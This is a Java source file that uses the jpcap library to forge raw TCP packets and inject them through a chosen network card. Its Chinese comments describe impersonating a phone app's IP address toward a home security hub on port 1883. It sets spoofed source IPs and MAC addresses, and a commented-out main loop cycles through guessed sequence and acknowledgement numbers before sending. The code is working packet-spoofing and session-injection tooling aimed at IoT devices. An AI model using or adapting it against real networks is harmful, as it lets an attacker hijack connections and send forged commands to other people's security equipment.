package Util.SetPacket;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import com.sun.org.apache.regexp.internal.recompile;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.TCPPacket;
import Model.Model_a;




public class SetTCP {
	
	/*static Manager_airdump ma = new Manager_airdump();
	static CapPacket cp = new CapPacket();*/
	/**
	 * @param args
	 */
	/*public static void main(String[] args)  {
		// TODO Auto-generated method stub
		//Manager_airdump ma = new Manager_airdump();
		*//*************************************************
		 * 无线网卡MAC"60:D8:19:4a:b2:fc"
		 * 主机MAC"AC:CF:23:87:BD:2E"
		 *************************************************//*
		
		//run()会得到分析出来的数据，选择要发送的数据
		//Model_a model= ma.run("1122.pcap","192.168.8.100","112233.pcap","192.168.8.101").get(0);
		SentTCP st = new SentTCP();
		//选择网卡
		JpcapSender js = getCrad(3);
		
		//cp.capPacket_run(0);
		
		
		List<TCPPacket> tcps = new ArrayList<TCPPacket>();
		
		long ack = 53464;
		long seq = 4645677;
		
		//伪造数据包,i表示seq增加的范围,j表示ACK增加的范围  
		for(int i = 0;i<5; i++ ){
			for(int j = 0;j<5;j++){
				
				TCPPacket tcp = st.fakePacket(1883,49157,seq, ack, "119.29.42.117", "192.168.8.101", 
						"60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", null);
				//每次伪造一个数据包之后identification都要加1,seq +2 
					tcps.add(tcp);
			}
		}
		
		
		//发送数据包
		sendPacket(js, tcps);
	}*/
	
	
	
	/*************************************************
	 * 辅助函数
	 *************************************************/
	
	  public static byte [] getMacBytes(String mac){
		  byte []macBytes = new byte[6];
		  String [] strArr = mac.split(":");
		  
		  for(int i = 0;i < strArr.length; i++){
		   int value = Integer.parseInt(strArr[i],16);
		   macBytes[i] = (byte) value;
		  }
		  return macBytes;
	 }
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * 构造数据包发送
	 *************************************************/
	  
	  public  TCPPacket fakePacket(Integer port_sou,Integer port_des,long seq,long ack,String ip_sou, String ip_des,String mac_src,
			  String mac_des,Model_a model_a){
		  
		  
		  TCPPacket tcp = null;
		  boolean ackfalg = true;
		  boolean pushfalg = true;
		  
		  if(model_a == null){
				ackfalg = true;
				pushfalg = false;
				tcp = new TCPPacket(port_sou, port_des, seq , ack, false, ackfalg, pushfalg, false, false, 
						false, false, false, 20904, 0);
				tcp.data ="".getBytes();
				
			}
			else {
				
				tcp = new TCPPacket(port_sou, port_des, seq , ack, false, ackfalg, pushfalg, false, false, 
						false, false, false, 20904, 0);
				
				if(model_a.getData_byte().length ==0){
					
					tcp.data ="".getBytes();
					tcp.psh = false;
					
				}else {
					tcp.data = model_a.getData_byte();
				}
				
				
				
			}
		  
			 
			
			InetAddress sip = null;
			InetAddress dip = null;
			try {
				sip = InetAddress.getByName(ip_sou);   //模拟手机APP端的IP地址
				dip = InetAddress.getByName(ip_des);	//主机在路由器下的IP地址
	//System.out.println("IP地址 souip:"+sip+"  desip"+dip);
	//System.out.println(" ");
			} catch (UnknownHostException e1) {
	System.out.println("IP地址初始化失败");
				e1.printStackTrace();
			}
			
			if(sip != null&&dip != null){
				//ip地址可以根据动态抓包得到的IP地址填入
				//306066是一个验证值，具体怎么产生方法未研究
				//52是生命周期，同样可以通过抓取的包来判断,6是指上层使用TCP
				//网络层IP
				tcp.setIPv4Parameter(0, false, false, false, 0, false, true, false, 0, 4645654, 52, 6,sip, dip);
				
				
			}
			
			//链路层
			EthernetPacket ether = new EthernetPacket();		
			ether.frametype = EthernetPacket.ETHERTYPE_IP;
			
			ether.src_mac = getMacBytes(mac_src);  //自己电脑的网卡
			ether.dst_mac = getMacBytes(mac_des);  //安防主机的,或者路由器的?
			
			tcp.datalink = ether;
			
		return tcp;    
	  }
	  
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * 该函数用于发送数据包
	 *************************************************/
	  public static void sendPacket(JpcapSender js,List<TCPPacket> tcps){
		  Robot r = null;
		  try {
			r = new Robot();
		} catch (AWTException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		  
		  if(js != null){
				try{
					for(int i = 0 ;i<tcps.size();i++){
						js.sendPacket(tcps.get(i));
						
							//延迟发送ms
							r.delay(1500);
							
							
System.out.println("发送了一条数据"+i);
System.out.println(tcps.get(i).toString());	
System.out.println("");
										
					}


				}catch(Exception e){
					e.printStackTrace();
				}finally{	
					js.close();
				}	
			}
		  
		  
		  
	  }
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * 获取用来发送数据的网卡
	 *************************************************/
	  public static JpcapSender getCrad(int deviceNum){
		  
			NetworkInterface[] devices = null;
			
			 try{    
				 //获取本机上的网络接口对象数组    
				  devices = JpcapCaptor.getDeviceList();
System.out.println("网卡获取成功  ");  
				 }catch(Exception ef){    
				            ef.printStackTrace();    
	System.out.println("显示网络接口数据失败:  "+ef);    
				    }  
			 
			JpcapSender js = null;
			
			try {
				js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
			} catch (IOException e1) {
	System.out.println("JSender建立不成功");
				e1.printStackTrace();
			}
			  
		  return js;
	  } 
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
}
